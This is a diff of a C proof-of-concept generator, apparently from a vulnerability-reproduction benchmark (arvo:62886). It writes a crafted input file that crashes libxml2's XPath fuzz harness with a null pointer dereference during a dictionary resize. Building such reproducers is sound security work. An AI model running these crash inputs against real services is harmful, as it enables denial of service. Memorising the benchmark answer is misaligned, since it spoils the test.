@@ -1,25 +1,30 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-
-/* PoC for arvo:62886 */
-/* Triggers: null pointer dereference in xmlDictFindEntry via subdict->table */
-/* Vuln class: null_pointer_dereference */
-/* Target: /out/xpath - input is a single XML/XSLT document */
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
     if (!f) { perror("fopen"); return 1; }
     
-    /* Write a single valid XSLT stylesheet that triggers xmlDictCreateSub via import */
-    const char *xslt = 
-        "<?xml version=\"1.0\"?>"
-        "<xsl:stylesheet version=\"1.0\""
-        " xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
-        "<xsl:import href=\"dummy\"/>"
-        "<xsl:template match=\"/\"/>"
-        "</xsl:stylesheet>";
-    fwrite(xslt, 1, strlen(xslt), f);
+    /* Bytes 0-3: maxAllocs = 30 (big-endian) to allow init but fail dict resize */
+    fputc(0x00, f);
+    fputc(0x00, f);
+    fputc(0x00, f);
+    fputc(0x1E, f);
+    
+    /* XPath expression: "//*" selects all elements, triggers dict growth */
+    fputs("//*", f);
+    fputc(0x5C, f);
+    fputc(0x0A, f);
+    
+    /* XML with many elements to force dict resizing during evaluation */
+    fprintf(f, "<?xml version=\"1.0\"?>");
+    fprintf(f, "<r>");
+    for (int i = 0; i < 100; i++) {
+        fprintf(f, "<a/>");
+    }
+    fprintf(f, "</r>");
+    fputc(0x5C, f);
+    fputc(0x0A, f);
     
     fclose(f);
     return 0;
